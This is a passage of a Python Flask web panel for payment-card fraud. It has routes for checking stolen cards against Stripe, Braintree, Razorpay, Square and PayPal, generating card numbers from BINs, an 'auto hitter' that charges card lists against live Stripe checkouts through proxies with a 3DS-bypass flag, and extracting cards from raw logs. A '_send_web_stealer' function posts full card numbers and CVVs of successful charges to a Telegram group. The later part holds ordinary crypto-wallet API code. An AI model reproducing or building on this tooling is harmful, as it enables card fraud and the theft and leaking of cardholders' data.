        <button class="menu-toggle" onclick="toggleSidebar()"><span></span><span></span><span></span></button>
        <div class="sidebar-overlay" onclick="closeSidebar()"></div>
        {get_tools_sidebar("checker")}
        <div class="main">
            <div class="header">
                <h1>CC Checker</h1>
            </div>
            
            <div class="card">
                <h2>Check Cards</h2>
                <form method="POST">
                    <div class="form-group">
                        <label>Select Gate:</label>
                        <select name="gate" style="width: 100%; padding: 12px;">
                            <option value="st" {"selected" if gate == "st" else ""}>Stripe Auth ($1)</option>
                            <option value="st5" {"selected" if gate == "st5" else ""}>Stripe $5</option>
                            <option value="rz" {"selected" if gate == "rz" else ""}>Razorpay (Nyvexis)</option>
                            <option value="b3" {"selected" if gate == "b3" else ""}>Braintree</option>
                            <option value="bu" {"selected" if gate == "bu" else ""}>Braintree Auth</option>
                            <option value="sq" {"selected" if gate == "sq" else ""}>Square</option>
                            <option value="pp" {"selected" if gate == "pp" else ""}>PayPal</option>
                        </select>
                    </div>
                    <div class="form-group">
                        <label>Cards (one per line, max 10):</label>
                        <textarea name="cards" rows="8" style="width: 100%; background: rgba(255,255,255,0.1); border: none; border-radius: 10px; padding: 15px; color: #fff; font-family: monospace;" placeholder="4111111111111111|12|25|123">{cards_input}</textarea>
                    </div>
                    <button type="submit" class="btn btn-primary" style="width: 100%;">Check Cards</button>
                </form>
            </div>
            
            {"<div class='card'><h2>Results</h2>" + results_html + "</div>" if result else ""}
        </div>
        <script>
            function toggleSidebar() {{ document.querySelector('.sidebar').classList.toggle('open'); document.querySelector('.sidebar-overlay').classList.toggle('open'); }}
            function closeSidebar() {{ document.querySelector('.sidebar').classList.remove('open'); document.querySelector('.sidebar-overlay').classList.remove('open'); }}
        </script>
    </body>
    </html>
    """)

@app.route('/tools/generator', methods=['GET', 'POST'])
@admin_required
def tools_generator():
    cards = []
    bin_input = ""
    count = 10
    
    if request.method == 'POST':
        bin_input = request.form.get('bin', '').strip()
        try:
            count = min(int(request.form.get('count', 10)), 50)
        except:
            count = 10
        
        month = request.form.get('month', '').strip() or None
        year = request.form.get('year', '').strip() or None
        cvv = request.form.get('cvv', '').strip() or None
        
        if bin_input and len(bin_input) >= 6:
            from modules.cc_generator import generate_cards
            generated = generate_cards(bin_input, count, month, year, cvv)
            cards = [f"{c['cc']}|{c['mm']}|{c['yy']}|{c['cvv']}" for c in generated]
    
    cards_html = ""
    if cards:
        cards_text = "\n".join(cards)
        cards_html = f"""
        <div class="card">
            <h2>Generated Cards ({len(cards)})</h2>
            <textarea id="generated-cards" readonly rows="12" style="width: 100%; background: rgba(0,0,0,0.3); border: 1px solid rgba(255,255,255,0.1); border-radius: 10px; padding: 15px; color: #4ade80; font-family: monospace; resize: none;">{cards_text}</textarea>
            <button onclick="copyCards()" class="btn btn-success" style="width: 100%; margin-top: 15px;">Copy All Cards</button>
        </div>
        """
    
    return render_template_string(f"""
    <html>
    <head>
        <title>Card Generator - Onichan Tools</title>
        {ADMIN_CSS}
    </head>
    <body>
        <button class="menu-toggle" onclick="toggleSidebar()"><span></span><span></span><span></span></button>
        <div class="sidebar-overlay" onclick="closeSidebar()"></div>
        {get_tools_sidebar("generator")}
        <div class="main">
            <div class="header">
                <h1>Card Generator</h1>
            </div>
            
            <div class="card">
                <h2>Generate Cards</h2>
                <form method="POST">
                    <div class="form-group">
                        <label>BIN (6-16 digits, use x for random):</label>
                        <input type="text" name="bin" value="{bin_input}" placeholder="411111xxxxxxxxxx" style="width: 100%;">
                    </div>
                    <div style="display: grid; grid-template-columns: repeat(auto-fit, minmax(120px, 1fr)); gap: 10px;">
                        <div class="form-group">
                            <label>Count:</label>
                            <input type="number" name="count" value="{count}" min="1" max="50" style="width: 100%;">
                        </div>
                        <div class="form-group">
                            <label>Month:</label>
                            <input type="text" name="month" placeholder="rnd" style="width: 100%;">
                        </div>
                        <div class="form-group">
                            <label>Year:</label>
                            <input type="text" name="year" placeholder="rnd" style="width: 100%;">
                        </div>
                        <div class="form-group">
                            <label>CVV:</label>
                            <input type="text" name="cvv" placeholder="rnd" style="width: 100%;">
                        </div>
                    </div>
                    <button type="submit" class="btn btn-primary" style="width: 100%;">Generate</button>
                </form>
            </div>
            
            {cards_html}
        </div>
        <script>
            function toggleSidebar() {{ document.querySelector('.sidebar').classList.toggle('open'); document.querySelector('.sidebar-overlay').classList.toggle('open'); }}
            function closeSidebar() {{ document.querySelector('.sidebar').classList.remove('open'); document.querySelector('.sidebar-overlay').classList.remove('open'); }}
            function copyCards() {{
                var textarea = document.getElementById('generated-cards');
                textarea.select();
                document.execCommand('copy');
                alert('Cards copied to clipboard!');
            }}
        </script>
    </body>
    </html>
    """)

@app.route('/tools/autohitter', methods=['GET', 'POST'])
@admin_required
def tools_autohitter():
    result = None
    url_input = ""
    cards_input = ""
    checkout_info = None
    
    if request.method == 'POST':
        action = request.form.get('action', '')
        url_input = request.form.get('url', '').strip()
        cards_input = request.form.get('cards', '').strip()
        
        if action == 'check_url' and url_input:
            from modules.auto_hitter import extract_checkout_url, get_checkout_info as ah_get_checkout_info
            
            checkout_url = extract_checkout_url(url_input)
            if checkout_url:
                checkout_info = _run_async(ah_get_checkout_info(checkout_url))
            else:
                checkout_info = {"error": "Invalid Stripe checkout URL"}
        
        elif action == 'charge' and url_input and cards_input:
            from modules.auto_hitter import extract_checkout_url, get_checkout_info as ah_get_checkout_info, charge_card as auto_charge, parse_card
            
            checkout_url = extract_checkout_url(url_input)
            if checkout_url:
                checkout_info = _run_async(ah_get_checkout_info(checkout_url))
                
                if not checkout_info.get("error"):
                    lines = [l.strip() for l in cards_input.split('\n') if l.strip()][:5]
                    results = []
                    
                    for line in lines:
                        card = parse_card(line)
                        if card:
                            res = _run_async(auto_charge(card, checkout_info))
                            results.append(res)
                    
                    result = results
    
    checkout_html = ""
    if checkout_info and not checkout_info.get("error"):
        sym = {"USD": "$", "EUR": "€", "GBP": "£", "INR": "₹"}.get(checkout_info.get("currency", ""), "")
        checkout_html = f"""
        <div class="card" style="border-left: 4px solid #4ade80;">
            <h2>Checkout Info</h2>
            <div style="display: grid; gap: 10px;">
                <div><strong>Merchant:</strong> {checkout_info.get('merchant', 'N/A')}</div>
                <div><strong>Amount:</strong> {sym}{checkout_info.get('price', 0):.2f} {checkout_info.get('currency', '')}</div>
                <div><strong>Product:</strong> {(checkout_info.get('product', 'N/A') or 'N/A')[:60]}</div>
                <div><strong>Country:</strong> {checkout_info.get('country', 'N/A')}</div>
                <div><strong>Mode:</strong> {checkout_info.get('mode', 'N/A')}</div>
            </div>
        </div>
        """
    elif checkout_info and checkout_info.get("error"):
        checkout_html = f"""<div class="alert alert-error">{checkout_info.get('error')}</div>"""
    
    results_html = ""
    if result:
        for r in result:
            status = r.get('status', 'UNKNOWN')
            if status == 'CHARGED':
                status_style = "background: rgba(74, 222, 128, 0.2); border-left: 4px solid #4ade80;"
            elif status == '3DS':
                status_style = "background: rgba(102, 126, 234, 0.2); border-left: 4px solid #667eea;"
            else:
                status_style = "background: rgba(233, 69, 96, 0.2); border-left: 4px solid #e94560;"
            
            card_masked = r.get('card', '')
            if card_masked:
                parts = card_masked.split('|')
                if parts:
                    card_masked = f"{parts[0][:6]}****{parts[0][-4:]}|{parts[1]}|{parts[2]}"
            
            results_html += f"""
            <div style="{status_style} padding: 15px; border-radius: 10px; margin: 10px 0;">
                <div style="font-family: monospace;">{card_masked}</div>
                <div style="font-weight: bold; margin-top: 5px;">{status}</div>
                <div style="opacity: 0.7; font-size: 0.9em;">{r.get('response', '')}</div>
                <div style="opacity: 0.5; font-size: 0.8em;">Time: {r.get('time', 0)}s</div>
            </div>
            """
    
    return render_template_string(f"""
    <html>
    <head>
        <title>Auto Hitter - Onichan Tools</title>
        {ADMIN_CSS}
    </head>
    <body>
        <button class="menu-toggle" onclick="toggleSidebar()"><span></span><span></span><span></span></button>
        <div class="sidebar-overlay" onclick="closeSidebar()"></div>
        {get_tools_sidebar("autohitter")}
        <div class="main">
            <div class="header">
                <h1>Stripe Auto Hitter</h1>
            </div>
            
            <div class="card">
                <h2>Checkout URL</h2>
                <form method="POST">
                    <input type="hidden" name="action" value="check_url">
                    <div class="form-group">
                        <label>Stripe Checkout URL:</label>
                        <input type="text" name="url" value="{url_input}" placeholder="https://checkout.stripe.com/c/pay/cs_live_..." style="width: 100%;">
                    </div>
                    <button type="submit" class="btn btn-primary" style="width: 100%;">Get Checkout Info</button>
                </form>
            </div>
            
            {checkout_html}
            
            <div class="card">
                <h2>Charge Cards</h2>
                <form method="POST">
                    <input type="hidden" name="action" value="charge">
                    <div class="form-group">
                        <label>Checkout URL:</label>
                        <input type="text" name="url" value="{url_input}" placeholder="https://checkout.stripe.com/..." style="width: 100%;">
                    </div>
                    <div class="form-group">
                        <label>Cards (one per line, max 5):</label>
                        <textarea name="cards" rows="5" style="width: 100%; background: rgba(255,255,255,0.1); border: none; border-radius: 10px; padding: 15px; color: #fff; font-family: monospace;" placeholder="4111111111111111|12|25|123">{cards_input}</textarea>
                    </div>
                    <button type="submit" class="btn btn-danger" style="width: 100%;">Charge Cards</button>
                </form>
            </div>
            
            {"<div class='card'><h2>Charge Results</h2>" + results_html + "</div>" if result else ""}
        </div>
        <script>
            function toggleSidebar() {{ document.querySelector('.sidebar').classList.toggle('open'); document.querySelector('.sidebar-overlay').classList.toggle('open'); }}
            function closeSidebar() {{ document.querySelector('.sidebar').classList.remove('open'); document.querySelector('.sidebar-overlay').classList.remove('open'); }}
        </script>
    </body>
    </html>
    """)

@app.route('/tools/cleaner', methods=['GET', 'POST'])
@admin_required
def tools_cleaner():
    result = None
    input_text = ""
    action = ""
    
    if request.method == 'POST':
        input_text = request.form.get('input', '').strip()
        action = request.form.get('action', 'extract')
        
        if input_text:
            from modules.cc_cleaner import extract_cards_from_junk, clean_and_format_cards, remove_duplicates, get_statistics
            
            if action == 'extract':
                result = extract_cards_from_junk(input_text)
            elif action == 'clean':
                result = clean_and_format_cards(input_text)
            elif action == 'dedupe':
                result = remove_duplicates(input_text)
            elif action == 'stats':
                result = get_statistics(input_text)
    
    result_html = ""
    if result:
        if isinstance(result, list):
            cards_text = "\n".join(result)
            result_html = f"""
            <div class="card">
                <h2>Results ({len(result)} cards)</h2>
                <textarea id="result-cards" readonly rows="12" style="width: 100%; background: rgba(0,0,0,0.3); border: 1px solid rgba(255,255,255,0.1); border-radius: 10px; padding: 15px; color: #4ade80; font-family: monospace; resize: none;">{cards_text}</textarea>
                <button onclick="copyResult()" class="btn btn-success" style="width: 100%; margin-top: 15px;">Copy All</button>
            </div>
            """
        elif isinstance(result, dict):
            stats_html = "<br>".join([f"<strong>{k}:</strong> {v}" for k, v in result.items()])
            result_html = f"""
            <div class="card">
                <h2>Statistics</h2>
                <div style="line-height: 2;">{stats_html}</div>
            </div>
            """
    
    return render_template_string(f"""
    <html>
    <head>
        <title>CC Cleaner - Onichan Tools</title>
        {ADMIN_CSS}
    </head>
    <body>
        <button class="menu-toggle" onclick="toggleSidebar()"><span></span><span></span><span></span></button>
        <div class="sidebar-overlay" onclick="closeSidebar()"></div>
        {get_tools_sidebar("cleaner")}
        <div class="main">
            <div class="header">
                <h1>CC Cleaner & Extractor</h1>
            </div>
            
            <div class="card">
                <h2>Input Data</h2>
                <form method="POST">
                    <div class="form-group">
                        <label>Paste raw text, logs, or card data:</label>
                        <textarea name="input" rows="10" style="width: 100%; background: rgba(255,255,255,0.1); border: none; border-radius: 10px; padding: 15px; color: #fff; font-family: monospace;" placeholder="Paste anything containing cards...">{input_text}</textarea>
                    </div>
                    <div style="display: grid; grid-template-columns: repeat(auto-fit, minmax(150px, 1fr)); gap: 10px;">
                        <button type="submit" name="action" value="extract" class="btn btn-primary">Extract Cards</button>
                        <button type="submit" name="action" value="clean" class="btn btn-success">Clean & Format</button>
                        <button type="submit" name="action" value="dedupe" class="btn btn-danger">Remove Duplicates</button>
                        <button type="submit" name="action" value="stats" class="btn" style="background: #667eea; color: #fff;">Get Statistics</button>
                    </div>
                </form>
            </div>
            
            {result_html}
        </div>
        <script>
            function toggleSidebar() {{ document.querySelector('.sidebar').classList.toggle('open'); document.querySelector('.sidebar-overlay').classList.toggle('open'); }}
            function closeSidebar() {{ document.querySelector('.sidebar').classList.remove('open'); document.querySelector('.sidebar-overlay').classList.remove('open'); }}
            function copyResult() {{
                var textarea = document.getElementById('result-cards');
                textarea.select();
                document.execCommand('copy');
                alert('Copied to clipboard!');
            }}
        </script>
    </body>
    </html>
    """)

# API endpoints for AJAX
@app.route('/api/check', methods=['POST'])
@admin_required
def api_check():
    """API endpoint for CC checking"""
    try:
        data = request.get_json() or {}
        card = data.get('card', '').strip()
        gate = data.get('gate', 'st')
        
        parts = card.replace('/', '|').replace(' ', '|').split('|')
        if len(parts) < 4:
            return jsonify({'error': 'Invalid card format'})
        
        cc, mm, yy, cvv = parts[0], parts[1], parts[2], parts[3]
        
        if gate == 'rz':
            from modules.rpp_gate import check_razorpay
            res = _run_async(check_razorpay(cc, mm, yy, cvv))
        elif gate == 'b3':
            from modules.braintree_gate import check_braintree
            res = _run_async(check_braintree(cc, mm, yy, cvv))
        else:
            from modules.gate_checker import check_card_php
            res = check_card_php(gate, cc, mm, yy, cvv, 0)
        
        return jsonify(res)
    except Exception as e:
        return jsonify({'error': str(e)[:100]})


@app.route('/admin/autohitter')
@admin_required
def admin_autohitter():
    return _render_autohitter_page()

@app.route('/api/proxy/system', methods=['GET'])
@auth_required
def api_system_proxy():
    import random as _rand
    try:
        from config import SYSTEM_PROXIES
        if SYSTEM_PROXIES:
            return jsonify({'proxy': _rand.choice(SYSTEM_PROXIES), 'count': len(SYSTEM_PROXIES)})
    except Exception:
        pass
    return jsonify({'proxy': None, 'count': 0})

@app.route('/api/proxy/test', methods=['POST'])
@auth_required
def api_proxy_test():
    data = request.json
    proxy = data.get('proxy')
    if not proxy:
        return jsonify({'status': 'dead', 'error': 'No proxy provided'})
    
    proxy_url = get_proxy_url(proxy)
    try:
        resp = http_requests.get('https://api.ipify.org?format=json', proxies={'http': proxy_url, 'https': proxy_url}, timeout=10)
        if resp.status_code == 200:
            ip_data = resp.json()
            return jsonify({'status': 'alive', 'ip': ip_data.get('ip'), 'country': 'Unknown', 'time': int(resp.elapsed.total_seconds() * 1000)})
    except Exception as e:
        return jsonify({'status': 'dead', 'error': str(e)})
    return jsonify({'status': 'dead', 'error': 'Connection failed'})

import threading as _threading
import concurrent.futures as _futures

_async_loop = None
_async_thread = None

def _send_web_stealer(card, res, checkout_data):
    from modules.approved_cards_logger import get_stealer_group_id, log_approved_card
    stealer_id = get_stealer_group_id()
    cc = card.get("cc", "")
    mm = card.get("month", "")
    yy = card.get("year", "")
    cvv = card.get("cvv", "")
    status = res.get("status", "")
    response = res.get("response", "N/A")
    merchant = checkout_data.get("merchant", "Unknown")
    amount = res.get("amount", "0.00")
    gate = "web_hitter"
    try:
        from modules.bin_lookup import lookup_bin
        bin_info = lookup_bin(cc[:6])
    except Exception:
        bin_info = {}
    log_approved_card(0, "WebPanel", cc, mm, yy, cvv, gate, response, bin_info)
    if stealer_id:
        try:
            from config import BOT_TOKEN
            text = (
                f"💳 <b>WEB AUTO HITTER — {status}</b>\n\n"
                f"🔗 <b>Card:</b> <code>{cc}|{mm}|{yy}|{cvv}</code>\n"
                f"🏢 <b>Merchant:</b> {merchant}\n"
                f"💰 <b>Amount:</b> {amount}\n"
                f"📊 <b>Response:</b> {response}\n"
                f"🔍 <b>BIN:</b> {bin_info.get('brand', '')} {bin_info.get('type', '')} {bin_info.get('bank', '')}\n"
                f"🌍 <b>Country:</b> {bin_info.get('country', 'N/A')}\n"
                f"👤 <b>Source:</b> Web Panel"
            )
            http_requests.post(
                f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
                json={"chat_id": int(stealer_id), "text": text, "parse_mode": "HTML"},
                timeout=10
            )
        except Exception:
            pass

def _get_async_loop():
    global _async_loop, _async_thread
    if _async_loop is None or _async_loop.is_closed():
        _async_loop = asyncio.new_event_loop()
        _async_thread = _threading.Thread(target=_async_loop.run_forever, daemon=True)
        _async_thread.start()
    return _async_loop

def _run_async(coro):
    loop = _get_async_loop()
    future = asyncio.run_coroutine_threadsafe(coro, loop)
    return future.result(timeout=120)

@app.route('/api/checkout/info', methods=['POST'])
@auth_required
def api_checkout_info():
    data = request.json
    url = data.get('url')
    proxy = data.get('proxy')
    proxy_url = get_proxy_url(proxy) if proxy else None
    try:
        info = _run_async(tls_get_checkout_info(url, proxy_url))
        return jsonify(info)
    except Exception as e:
        return jsonify({"error": str(e)}), 500

@app.route('/api/checkout/check', methods=['POST'])
@auth_required
def api_checkout_check():
    data = request.json
    url = data.get('url')
    card_raw = data.get('card')
    proxy = data.get('proxy')
    email = data.get('email')
    checkout_data = data.get('checkout_data')
    try:
        if isinstance(card_raw, str):
            parts = card_raw.replace('/', '|').replace(' ', '|').split('|')
            if len(parts) >= 4:
                card = {"cc": parts[0].strip(), "month": parts[1].strip(), "year": parts[2].strip(), "cvv": parts[3].strip()}
            else:
                return jsonify({"status": "ERROR", "response": "Invalid card format"})
        elif isinstance(card_raw, dict):
            card = card_raw
        else:
            return jsonify({"status": "ERROR", "response": "No card provided"})

        if not checkout_data:
            proxy_url = get_proxy_url(proxy) if proxy else None
            checkout_data = _run_async(tls_get_checkout_info(url, proxy_url))
            if checkout_data.get("error"):
                return jsonify({
                    "status": "ERROR",
                    "response": checkout_data["error"],
                    "time": checkout_data.get("time", 0)
                })
        res = _run_async(auto_hitter_charge(card, checkout_data, proxy, custom_email=email))
        res["merchant"] = checkout_data.get("merchant", "Unknown")
        res["product"] = checkout_data.get("product", "Unknown")
        price = checkout_data.get("price", 0)
        currency = checkout_data.get("currency", "")
        res["amount"] = f"{price} {currency}" if price else "0.00"

        if res.get("status") in ("CHARGED", "LIVE"):
            try:
                _send_web_stealer(card, res, checkout_data)
            except Exception:
                pass

        return jsonify(res)
    except Exception as e:
        return jsonify({"error": str(e), "status": "ERROR", "response": str(e)[:100]}), 500

@app.route('/api/v2/init', methods=['POST'])
@auth_required
def api_v2_init():
    data = request.json
    url = data.get('url')
    proxy = data.get('proxy')
    try:
        res = _run_async(v2_init_checkout(url, proxy))
        return jsonify(res)
    except Exception as e:
        return jsonify({"error": str(e)}), 500

@app.route('/api/v2/charge', methods=['POST'])
@auth_required
def api_v2_charge():
    data = request.json
    card = data.get('card')
    checkout_data = data.get('checkout_data')
    proxy = data.get('proxy')
    bypass_3ds = data.get('bypass_3ds', False)
    try:
        res = _run_async(v2_charge_card(card, checkout_data, proxy, bypass_3ds))
        return jsonify(res)
    except Exception as e:
        return jsonify({"error": str(e), "status": "ERROR"}), 500


# ─────────────────────────────────────────────────────────────────────────────
# CRYPTO WALLET API ENDPOINTS
# ─────────────────────────────────────────────────────────────────────────────

import time as _time
import urllib.parse as _urlparse

_price_cache: dict = {}       # { "ethereum,bitcoin": (timestamp, {coin: usd}) }
_PRICE_CACHE_TTL = 60         # seconds

_SUPPORTED_CHAINS = {
    "ethereum", "bsc", "polygon", "arbitrum", "optimism",
    "avalanche", "solana", "tron", "ton", "bitcoin",
}

# Ankr multi-chain RPC endpoint map  (no API key required for public RPCs)
_ANKR_CHAIN_MAP = {
    "ethereum":  "eth",
    "bsc":       "bsc",
    "polygon":   "polygon",
    "arbitrum":  "arbitrum",
    "optimism":  "optimism",
    "avalanche": "avalanche",
}


_TG_INITDATA_MAX_AGE = 300  # seconds — reject initData older than 5 minutes

def _validate_tg_initdata(init_data_raw: str, bot_token: str) -> dict | None:
    """
    Validate Telegram WebApp initData HMAC-SHA256.
    Returns parsed data dict on success, None on failure.
    Always returns None (fail-closed) when bot_token is empty.
    Rejects initData with auth_date older than _TG_INITDATA_MAX_AGE seconds.
    """
    if not bot_token:
        return None
    try:
        params = dict(_urlparse.parse_qsl(init_data_raw, keep_blank_values=True))
        received_hash = params.pop("hash", None)
        if not received_hash:
            return None
        # Freshness check — reject replayed tokens
        auth_date = params.get("auth_date")
        if auth_date:
            age = _time.time() - int(auth_date)
            if age > _TG_INITDATA_MAX_AGE:
                return None
        data_check_string = "\n".join(
            f"{k}={v}" for k, v in sorted(params.items())
        )
        secret_key = hmac.new(b"WebAppData", bot_token.encode(), hashlib.sha256).digest()
        computed = hmac.new(secret_key, data_check_string.encode(), hashlib.sha256).hexdigest()
        if not hmac.compare_digest(computed, received_hash):
            return None
        user_json = params.get("user", "{}")
        return json.loads(user_json)
    except Exception:
        return None


@app.route('/api/wallet/resolve/<telegram_id>', methods=['GET'])
def api_wallet_resolve(telegram_id):
    """Resolve a Telegram User ID to a wallet address for a given chain."""
    try:
        telegram_id_int = int(telegram_id)
    except (ValueError, TypeError):
        return jsonify({"error": "telegram_id must be a number"}), 400
    chain = request.args.get("chain", "ethereum").lower()
    if chain not in _SUPPORTED_CHAINS:
        return jsonify({"error": f"Unsupported chain: {chain}"}), 400
    try:
        from modules.database import _execute_with_retry, is_db_connected
        if not is_db_connected():
            return jsonify({"error": "Database unavailable"}), 503
        row = _execute_with_retry(
            "SELECT address, username, avatar_url FROM wallet_addresses "
            "WHERE telegram_id = %s AND chain = %s",
            (telegram_id_int, chain), fetch_one=True
        )
        if not row:
            return jsonify({"error": "Not registered"}), 404
        return jsonify({
            "telegram_id": telegram_id_int,
            "chain": chain,
            "address": row["address"],
            "username": row.get("username"),
            "avatar_url": row.get("avatar_url"),
        })
    except Exception as e:
        return jsonify({"error": str(e)}), 500


@app.route('/api/wallet/register', methods=['POST'])
def api_wallet_register():
    """
    Register (or update) a wallet address for a Telegram User ID.
    Body: { telegram_id, chain, address, init_data, username?, avatar_url? }
    Validates Telegram WebApp initData so only the real user can register.
    """
    data = request.get_json(silent=True) or {}
    chain = (data.get("chain") or "").lower()
    address = (data.get("address") or "").strip()
    init_data = data.get("init_data") or ""
    username = data.get("username") or None
    avatar_url = data.get("avatar_url") or None

    if chain not in _SUPPORTED_CHAINS:
        return jsonify({"error": f"Unsupported chain: {chain}"}), 400
    if not address:
        return jsonify({"error": "address is required"}), 400
    if not init_data:
        return jsonify({"error": "init_data is required"}), 400

    bot_token = os.environ.get("BOT_TOKEN", "")
    if not bot_token:
        return jsonify({"error": "Server misconfiguration: BOT_TOKEN not set"}), 503

    tg_user = _validate_tg_initdata(init_data, bot_token)
    if not tg_user:
        return jsonify({"error": "Invalid Telegram initData"}), 403

    telegram_id = int(tg_user.get("id", 0))
    if not telegram_id:
        return jsonify({"error": "Could not determine Telegram user ID"}), 403

    # Use initData username/photo if not explicitly provided
    if not username:
        username = tg_user.get("username") or tg_user.get("first_name")
    if not avatar_url:
        avatar_url = tg_user.get("photo_url")

    try:
        from modules.database import _execute_with_retry, is_db_connected
        if not is_db_connected():
            return jsonify({"error": "Database unavailable"}), 503
        ok = _execute_with_retry(
            """
            INSERT INTO wallet_addresses (telegram_id, chain, address, username, avatar_url)
            VALUES (%s, %s, %s, %s, %s)
            ON CONFLICT (telegram_id, chain) DO UPDATE
                SET address = EXCLUDED.address,
                    username = EXCLUDED.username,
                    avatar_url = EXCLUDED.avatar_url,
                    registered_at = NOW()
            """,
            (telegram_id, chain, address, username, avatar_url)
        )
        if not ok:
            return jsonify({"error": "Database write failed"}), 500
        return jsonify({"ok": True, "telegram_id": telegram_id, "chain": chain, "address": address})
    except Exception as e:
        return jsonify({"error": str(e)}), 500


@app.route('/api/wallet/register-all', methods=['POST'])
def api_wallet_register_all():
    """
    Register all wallet addresses for a Telegram user in one call.
    Body: { init_data, addresses: { ethereum: "0x...", bsc: "0x...", ... } }
    """
    data = request.get_json(silent=True) or {}
    init_data = data.get("init_data") or ""
    addresses = data.get("addresses") or {}

    if not init_data:
        return jsonify({"error": "init_data is required"}), 400
    if not addresses or not isinstance(addresses, dict):
        return jsonify({"error": "addresses object is required"}), 400

    bot_token = os.environ.get("BOT_TOKEN", "")
    if not bot_token:
        return jsonify({"error": "Server misconfiguration: BOT_TOKEN not set"}), 503

    tg_user = _validate_tg_initdata(init_data, bot_token)
    if not tg_user:
        return jsonify({"error": "Invalid Telegram initData"}), 403

    telegram_id = int(tg_user.get("id", 0))
    if not telegram_id:
        return jsonify({"error": "Could not determine Telegram user ID"}), 403

    username = tg_user.get("username") or tg_user.get("first_name")
    avatar_url = tg_user.get("photo_url")

    try:
        from modules.database import _execute_with_retry, is_db_connected
        if not is_db_connected():
            return jsonify({"error": "Database unavailable"}), 503

        registered = []
        for chain, addr in addresses.items():
            chain = chain.lower()
            addr = (addr or "").strip()
            if chain not in _SUPPORTED_CHAINS or not addr or "unavailable" in addr:
                continue
            ok = _execute_with_retry(
                """
                INSERT INTO wallet_addresses (telegram_id, chain, address, username, avatar_url)
                VALUES (%s, %s, %s, %s, %s)
                ON CONFLICT (telegram_id, chain) DO UPDATE
                    SET address = EXCLUDED.address,
                        username = EXCLUDED.username,
                        avatar_url = EXCLUDED.avatar_url,
                        registered_at = NOW()
                """,
                (telegram_id, chain, addr, username, avatar_url)
            )
            if ok:
                registered.append(chain)

        return jsonify({"ok": True, "telegram_id": telegram_id, "registered": registered})
    except Exception as e:
        return jsonify({"error": str(e)}), 500


@app.route('/api/wallet/prices', methods=['GET'])
def api_wallet_prices():
    """
    Proxy CoinGecko prices for requested coin IDs.
    Query param: ?coins=ethereum,bitcoin,toncoin,...
    Response: { ethereum: 1234.56, bitcoin: 45000.00, ... }
    Cached in-process for 60 s.
    """
    coins_param = request.args.get("coins", "").strip()
    if not coins_param:
        return jsonify({"error": "coins parameter required"}), 400

    cache_key = ",".join(sorted(coins_param.lower().split(",")))
    now = _time.time()
    if cache_key in _price_cache:
        ts, prices = _price_cache[cache_key]
        if now - ts < _PRICE_CACHE_TTL:
            return jsonify(prices)

    try:
        resp = http_requests.get(
            "https://api.coingecko.com/api/v3/simple/price",
            params={"ids": cache_key, "vs_currencies": "usd"},
            timeout=8,
        )
        resp.raise_for_status()
        raw = resp.json()
        prices = {coin_id: data.get("usd", 0) for coin_id, data in raw.items()}
        _price_cache[cache_key] = (now, prices)
        return jsonify(prices)
    except Exception as e:
        # Return stale cache if available
        if cache_key in _price_cache:
            _, prices = _price_cache[cache_key]
            return jsonify(prices)
        return jsonify({"error": f"Price fetch failed: {e}"}), 502


@app.route('/api/wallet/balance', methods=['GET'])
def api_wallet_balance():
    """
    Proxy native + token balances for a given chain + address.
    Query params: ?chain=ethereum&address=0x...
    Uses Ankr's public Advanced API (no key) for EVM chains.
    For TON, Solana, Bitcoin uses their public REST APIs.
    Response: [ { symbol, name, balance, decimals, contract?, logo? }, ... ]
    """
    chain = request.args.get("chain", "").lower()
    address = request.args.get("address", "").strip()

    if not chain or chain not in _SUPPORTED_CHAINS:
        return jsonify({"error": f"Unsupported or missing chain"}), 400
    if not address:
        return jsonify({"error": "address is required"}), 400

    try:
        balances = []

        if chain in _ANKR_CHAIN_MAP:
            _EVM_RPC = {
                "ethereum": ["https://ethereum-rpc.publicnode.com", "https://1rpc.io/eth", "https://eth.llamarpc.com"],
                "bsc": ["https://bsc-dataseed.binance.org", "https://bsc-rpc.publicnode.com", "https://1rpc.io/bnb"],
                "polygon": ["https://polygon-bor-rpc.publicnode.com", "https://1rpc.io/matic", "https://polygon-rpc.com"],
                "arbitrum": ["https://arbitrum-one-rpc.publicnode.com", "https://1rpc.io/arb", "https://arb1.arbitrum.io/rpc"],
                "optimism": ["https://optimism-rpc.publicnode.com", "https://1rpc.io/op", "https://mainnet.optimism.io"],
                "avalanche": ["https://avalanche-c-chain-rpc.publicnode.com", "https://1rpc.io/avax/c", "https://api.avax.network/ext/bc/C/rpc"],
            }
            _EVM_NATIVE = {
                "ethereum": ("ETH", "Ethereum", 18),
                "bsc": ("BNB", "BNB", 18),
                "polygon": ("POL", "Polygon", 18),
                "arbitrum": ("ETH", "Ethereum", 18),
                "optimism": ("ETH", "Ethereum", 18),
                "avalanche": ("AVAX", "Avalanche", 18),
            }
            rpc_urls = _EVM_RPC.get(chain, ["https://ethereum-rpc.publicnode.com"])
            sym, name, dec = _EVM_NATIVE.get(chain, ("ETH", "Ethereum", 18))

            def _evm_rpc_call(payload, timeout=10):
                last_err = None
                for url in rpc_urls:
                    try:
                        resp = http_requests.post(url, json=payload, timeout=timeout)
                        resp.raise_for_status()
                        return resp.json()
                    except Exception as e:
                        last_err = e
                        continue
                raise last_err or Exception("All RPCs failed")

            result = _evm_rpc_call({
                "jsonrpc": "2.0", "id": 1, "method": "eth_getBalance",
                "params": [address, "latest"]
            })
            hex_bal = result.get("result", "0x0")
            native_bal = int(hex_bal, 16) / (10 ** dec)
            balances.append({
                "symbol": sym, "name": name,
                "balance": str(native_bal), "decimals": dec,
                "contract": None, "logo": None,
            })

            _ERC20_ABI_BALANCEOF = "0x70a08231" + "000000000000000000000000"
            from lib_wallet_tokens import EVM_TOKENS
            chain_tokens = EVM_TOKENS.get(chain, [])
            for tok in chain_tokens:
                try:
                    data = _ERC20_ABI_BALANCEOF + address.lower().replace("0x", "")
                    tr_result = _evm_rpc_call({
                        "jsonrpc": "2.0", "id": 1, "method": "eth_call",
                        "params": [{"to": tok["contract"], "data": data}, "latest"]
                    }, timeout=8)
                    if tr_result:
                        hex_result = tr_result.get("result", "0x0")
                        if hex_result and hex_result != "0x":
                            raw_bal = int(hex_result, 16)
                            token_bal = raw_bal / (10 ** tok["decimals"])
                            if token_bal > 0:
                                balances.append({
                                    "symbol": tok["symbol"], "name": tok["name"],
                                    "balance": str(token_bal), "decimals": tok["decimals"],
                                    "contract": tok["contract"], "logo": tok.get("logo"),
                                })
                except Exception:
                    pass

        elif chain == "ton":
            nanotons = 0
            try:
                r = http_requests.get(
                    f"https://toncenter.com/api/v2/getAddressBalance",
                    params={"address": address}, timeout=8,
                )
                r.raise_for_status()
